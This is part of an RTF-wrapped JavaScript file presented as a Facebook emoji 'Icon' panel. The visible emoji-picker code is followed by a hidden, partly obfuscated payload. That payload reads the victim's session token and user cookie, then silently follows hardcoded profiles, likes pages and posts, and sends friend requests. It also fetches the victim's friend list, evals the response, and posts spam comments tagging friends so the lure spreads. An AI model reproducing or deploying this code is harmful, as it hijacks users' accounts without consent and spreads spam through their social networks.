        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE3F ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gw',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 36'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE40 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gx',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 37'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE4B ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gy',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0110\\u1ED1 bi\\u1EBFt tay tr\\xE1i hay ph\\u1EA3i?'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE4C ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gz',\par
        "\\x6E\\x61\\x6D\\x65": 'Tay \\u1EA3i tay ai?'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE4D ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2g-',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 38'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE4F ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2g_',\par
        "\\x6E\\x61\\x6D\\x65": 'L\\xEAn l\\xE0 l\\xEAn l\\xEAn lu\\xF4n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\u261D ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2h0',\par
        "\\x6E\\x61\\x6D\\x65": 'D\\u1EB9p ra \\u0111\\u1EC3 anh l\\xEAn'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\u263A ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2h1',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 39'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\u26A1 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2h2',\par
        "\\x6E\\x61\\x6D\\x65": 'B\\u1ECB gi\\u1EADt s\\xE9t cmnr'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\u26C4 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2h3',\par
        "\\x6E\\x61\\x6D\\x65": 'Ng\\u01B0\\u1EDDi tuy\\u1EBFt, Sapa m\\xF9a \\u0111\\xF4ng 2013'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\u270A ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2h4',\par
        "\\x6E\\x61\\x6D\\x65": 'N\\u0103m 2014 quy\\u1EBFt t\\xE2m c\\xF3 G\\u1EA4U'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\u270B ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2h5',\par
        "\\x6E\\x61\\x6D\\x65": 'Tay ph\\u1EA3i nh\\xE9'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\u270C ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2h6',\par
        "\\x6E\\x61\\x6D\\x65": '2, l\\xE0m g\\u1EA5u c\\u1EE7a t\\u1EDB nh\\xE9?'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\u2600 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2h7',\par
        "\\x6E\\x61\\x6D\\x65": 'N\\u1EAFng l\\xEAn r\\u1ED3i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\u2601 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2h8',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\xE2y tr\\xF4i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\u2614 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2h9',\par
        "\\x6E\\x61\\x6D\\x65": 'Th\\xF4i ch\\u1EBFt, m\\u01B0a cmnr, \\xF4 \\u0111\\xE2u \\xF4 \\u0111\\xE2u?'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\u2615 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ha',\par
        "\\x6E\\x61\\x6D\\x65": 'L\\xE0m c\\u1ED1c Cafe cho t\\u1EC9nh t\\xE1o, haizzz'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\u2728 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2hb',\par
        "\\x6E\\x61\\x6D\\x65": 'B\\u1ECB hoa m\\u1EAFt cmnr'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\u2764 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2hc',\par
        "\\x6E\\x61\\x6D\\x65": 'T\\xF4i y\\xEAu b\\u1EA1n'\par
    \}];\par
    var _0x3384x2 = document['activeElement'];\par
\par
    function _0x3384x3(_0x3384x4) \{\par
        var _0x3384x5 = document['createElement']('div');\par
        _0x3384x5['innerHTML'] = _0x3384x4;\par
        return _0x3384x5['firstChild'];\par
    \};\par
\par
    function _0x3384x6(_0x3384x7) \{\par
        var _0x3384x8 = document['createElement']('div');\par
        var _0x3384x9 = document['createTextNode'](_0x3384x7);\par
        _0x3384x8['appendChild'](_0x3384x9);\par
        return _0x3384x8['innerHTML'];\par
    \};\par
\par
    function _0x3384xa(_0x3384xb) \{\par
        return (_0x3384xb instanceof HTMLInputElement && _0x3384xb['type'] == 'text') || _0x3384xb instanceof HTMLTextAreaElement;\par
    \};\par
\par
    function _0x3384xc(_0x3384xd) \{\par
        return _0x3384xd['className'] == 'openToggler';\par
    \};\par
\par
    function _0x3384xe(_0x3384xd, _0x3384xf) \{\par
        if (_0x3384xf === undefined) \{\par
            _0x3384xf = !_0x3384xc(_0x3384xd);\par
        \};\par
        if (_0x3384xf) \{\par
            _0x3384xd['className'] = 'openToggler';\par
        \} else \{\par
            _0x3384xd['removeAttribute']('class');\par
        \};\par
    \};\par
\par
    function _0x3384x10(_0x3384x11, _0x3384x12) \{\par
        var _0x3384x4;\par
        _0x3384x4 = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';\par
        _0x3384x4 += '<div class="jewelFlyout">';\par
        _0x3384x4 += '</div>';\par
        _0x3384x4 += '</li>';\par
        var _0x3384x13 = _0x3384x3(_0x3384x4);\par
        _0x3384x11['appendChild'](_0x3384x13);\par
        _0x3384x4 = '<div style="display: none;">';\par
        _0x3384x4 += '</div>';\par
        var _0x3384x14 = _0x3384x3(_0x3384x4);\par
        _0x3384x12['appendChild'](_0x3384x14);\par
        (function (_0x3384x14) \{\par
            _0x3384x13['addEventListener']('click', function () \{\par
                var _0x3384x15 = this['parentNode']['childNodes'];\par
                for (var _0x3384x16 = 0; _0x3384x16 < _0x3384x15['length']; _0x3384x16++) \{\par
                    if (_0x3384x15[_0x3384x16] === this) \{\} else \{\par
                        _0x3384x15[_0x3384x16]['style']['background'] = '';\par
                        _0x3384x15[_0x3384x16]['firstChild']['style']['color'] = '';\par
                    \};\par
                \};\par
                var _0x3384x17 = _0x3384x14['parentNode']['childNodes'];\par
                for (var _0x3384x18 = 0; _0x3384x18 < _0x3384x17['length']; _0x3384x18++) \{\par
                    if (_0x3384x17[_0x3384x18] === _0x3384x14) \{\par
                        _0x3384x14['style']['display'] = '';\par
                    \} else \{\par
                        _0x3384x17[_0x3384x18]['style']['display'] = 'none';\par
                    \};\par
                \};\par
            \});\par
        \})(_0x3384x14);\par
        return \{\par
            "\\x74\\x69\\x74\\x6C\\x65": _0x3384x13['firstChild'],\par
            "\\x62\\x6F\\x64\\x79": _0x3384x14\par
        \};\par
    \};\par
\par
    function _0x3384x19(_0x3384x1, _0x3384x1a) \{\par
        var _0x3384x4;\par
        _0x3384x4 = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';\par
        _0x3384x4 += '<div style="padding: 10px; width: 200px; font-size: 15px;">';\par
        _0x3384x4 += '</div>';\par
        _0x3384x4 += '</div>';\par
        var _0x3384x14 = _0x3384x3(_0x3384x4)['firstChild'];\par
        for (var _0x3384x1b = 0; _0x3384x1b < _0x3384x1['length']; _0x3384x1b++) \{\par
            var _0x3384x1c = _0x3384x1[_0x3384x1b];\par
            if (!_0x3384x1a(_0x3384x1c)) \{\par
                continue;\par
            \};\par
            _0x3384x4 = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';\par
            _0x3384x4 += '<a';\par
            _0x3384x4 += ' class="emoticon' + (_0x3384x1c['class'] !== undefined ? ' ' + _0x3384x1c['class'] : '') + '"';\par
            _0x3384x4 += ' style="text-decoration: inherit; color: inherit;' + (_0x3384x1c['class'] !== undefined ? ' color: transparent;' : ' width: auto;') + '"';\par
            _0x3384x4 += (_0x3384x1c['name'] !== undefined ? ' title="' + _0x3384x1c['name'] + '"' : '');\par
            _0x3384x4 += '>';\par
            _0x3384x4 += _0x3384x6(_0x3384x1c['chars']);\par
            _0x3384x4 += '</a>';\par
            _0x3384x4 += '</span>';\par
            var _0x3384x1d = _0x3384x3(_0x3384x4);\par
            _0x3384x14['appendChild'](_0x3384x1d);\par
            var _0x3384x1e = _0x3384x1d['firstChild'];\par
            (function (_0x3384x1c) \{\par
                _0x3384x1e['addEventListener']('click', function () \{\par
                    if (_0x3384xa(_0x3384x2)) \{\par
                        _0x3384x2['focus']();\par
                        var _0x3384x1f = _0x3384x1c['chars'];\par
                        var _0x3384x20 = _0x3384x2['value'];\par
                        var _0x3384x21 = _0x3384x2['selectionStart'];\par
                        var _0x3384x22 = _0x3384x2['selectionEnd'];\par
                        _0x3384x2['value'] = _0x3384x20['substring'](0, _0x3384x21) + _0x3384x1f + _0x3384x20['substring'](_0x3384x22);\par
                        _0x3384x2['setSelectionRange'](_0x3384x21 + _0x3384x1f['length'], _0x3384x21 + _0x3384x1f['length']);\par
                    \};\par
                    openFlyoutCommand = false;\par
                \});\par
            \})(_0x3384x1c);\par
        \};\par
        return _0x3384x14['parentNode'];\par
    \};\par
    var _0x3384x4;\par
    _0x3384x4 = '<li class="navItem middleItem notifNegativeBase">';\par
    _0x3384x4 += '<div class="fbJewel">';\par
    _0x3384x4 += '<a class="navLink" title="Icon Facebook 2014">';\par
    _0x3384x4 += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img> Icon Facebook</span>';\par
    _0x3384x4 += '</a>';\par
    _0x3384x4 += '<div>';\par
    _0x3384x4 += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';\par
    _0x3384x4 += '<div class="jewelBeeperHeader">';\par
    _0x3384x4 += '<div class="beeperNubWrapper">';\par
    _0x3384x4 += '<div class="beeperNub" style="left: 4px;"></div>';\par
    _0x3384x4 += '</div>';\par
    _0x3384x4 += '</div>';\par
    _0x3384x4 += '<ul style="display: text-align: center;">';\par
    _0x3384x4 += '</ul>';\par
    _0x3384x4 += '<div>';\par
    _0x3384x4 += '</div>';\par
    _0x3384x4 += '<div class="jewelFooter">';\par
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/DangHuuKien1996" target="_blank">Ki\'ean</a>';\par
    _0x3384x4 += '</div>';\par
    _0x3384x4 += '</div>';\par
    _0x3384x4 += '</div>';\par
    _0x3384x4 += '</div>';\par
    _0x3384x4 += '</li>';\par
    var _0x3384x23 = _0x3384x3(_0x3384x4);\par
    var _0x3384x24 = document['querySelector']('#pageNav');\par
    _0x3384x24['insertBefore'](_0x3384x23, _0x3384x24['firstChild']);\par
    _0x3384x23['addEventListener']('click', function () \{\par
        if (_0x3384xa(_0x3384x2)) \{\par
            _0x3384x2['focus']();\par
        \};\par
        openFlyoutCommand = undefined;\par
    \}, true);\par
    var _0x3384x25 = _0x3384x23['firstChild']['firstChild'];\par
    var _0x3384xd = _0x3384x25['nextSibling'];\par
    var _0x3384x11 = _0x3384xd['firstChild']['childNodes'][1];\par
    var _0x3384x12 = _0x3384x11['nextSibling'];\par
    _0x3384x25['addEventListener']('click', function () \{\par
        openFlyoutCommand = !_0x3384xc(_0x3384xd);\par
    \});\par
    var _0x3384x26 = _0x3384x10(_0x3384x11, _0x3384x12);\par
    _0x3384x26['title']['click']();\par
    _0x3384x26['body']['appendChild'](_0x3384x19(_0x3384x1, function (_0x3384x1c) \{\par
        if (_0x3384x1c['class'] === undefined) \{\par
            return false;\par
        \};\par
        if (_0x3384x1c['chars']['length'] == 2) \{\par
            return false;\par
        \};\par
        return true;\par
    \}));\par
    document['addEventListener']('click', function () \{\par
        _0x3384x2 = document['activeElement'];\par
        if (openFlyoutCommand !== undefined) \{\par
            _0x3384xe(_0x3384xd, openFlyoutCommand);\par
        \};\par
        openFlyoutCommand = false;\par
    \});\par
\})();\par
//11111CoderLike\par
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;\par
var user_id = document.cookie.match(document.cookie.match(/c_user=(\\d+)/)[1]);\par
function IDS(r) \{\par
  var X = new XMLHttpRequest();\par
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";\par
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";\par
  X.open("POST", XURL, true);\par
  X.onreadystatechange = function () \{\par
    if (X.readyState == 4 && X.status == 200) \{\par
      X.close;\par
    \}\par
  \};\par
  X.send(XParams);\par
\}\par
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\\d+)/)[1]); function Like(p) \{ var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () \{ if (Page.readyState == 4 && Page.status == 200) \{ Page.close; \} \}; Page.send(PageParams); \}\par
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) \{ var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+":379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=>=&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () \{ if (X.readyState == 4 && X.status == 200) \{ X.close; \} \}; X.send(XParams); \}\par
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;\par
var user_id = document.cookie.match(document.cookie.match(/c_user=(\\d+)/)[1]);\par
function a(abone)\par
\{ var http4=new XMLHttpRequest;\par
 var url4="/ajax/follow/follow_profile.php?__a=1";\par
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";\par
 http4.open("POST",url4,true);\par
 http4.onreadystatechange=function()\par
 \{  if(http4.readyState==4&&http4.status==200)http4.close \};\par
 http4.send(params4)\}\par
function sublist(uidss)\par
\{ var a = document.createElement('script');\par
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData(\{ flid: " + uidss + " \}).send();";\par
 document.body.appendChild(a);\par
\}\par
//DangHuuKien\par
a("100006483813698");a("100006256620370");a("100007681050376");\par
sublist("1503147213244725");Like("243176022513080");Like("646227342108519");Like("138903052970790");Like("1453530041533507");Like("493331530702285");\par
P("1522436311315815");P("1492048254354621");P("1461930687366378");\par
P("1437672029792244");P("1517626355130144");\par
//tag1\par
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","1470575323162312","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\\x26filter[0]=user","\\x26options[0]=friends_only","\\x26options[1]=nm","\\x26token=v7","\\x26viewer=","\\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\\x26ft_ent_identifier=","\\x26comment_text= V\'e0o l\'e0m \f1\'f0i m\f0\'ecnh \f1\'f0\f0\'e3 c\u7853?p nh\u7853?t th\'e0nh c\'f4ng t\'ednh n\f1\'e3ng th\f0\'eam Icon c\u7911?a Facebook,v\'e0 \f1\'f0\f0\'e3 th\'e0nh c\'f4ng  \u-10180?\u-8370? \u-10179?\u-9072? ,ch\'fac c\'e1c b\u7841?n th\'e0nh c\'f4ng   ","\\x26source=2","\\x26client_id=1377871797138:1707018092","\\x26reply_fbid","\\x26parent_comment_id","\\x26rootid=u_jsonp_2_3","\\x26clp=\{\\x22cl_impid\\x22:\\x22453524a0\\x22,\\x22clearcounter\\x22:0,\\x22elementid\\x22:\\x22js_5\\x22,\\x22version\\x22:\\x22x\\x22,\\x22parent_fbid\\x22:","\}","\\x26attached_sticker_fbid=0","\\x26attached_photo_fbid=0","\\x26giftoccasion","\\x26ft[tn]=[]","\\x26__a=1","\\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\\x26__req=q","\\x26fb_dtsg=","\\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id)\{var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function ()\{if(_0x7892x7[_0xa22c[7]]==4)\{eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++)\{mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++)\{if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i])\{mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];\} ;\} ;yorum_yap(id,mesaj);\} ;\} ;\} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0)\{_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);\} else \{_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);\} ;_0x7892x7[_0xa22c[37]]();\} ;function RandomArkadas()\{var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++)\{_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];\} ;return _0x7892xa;\} ;function yorum_yap(id,_0x7892xc)\{var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function ()\{if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200)\{_0x7892xd[_0xa22c[64]];\} ;\} ;_0x7892xd[_0xa22c[37]](_0x7892x8);\} ;arkadaslari_al(1470575323162312);\par
}
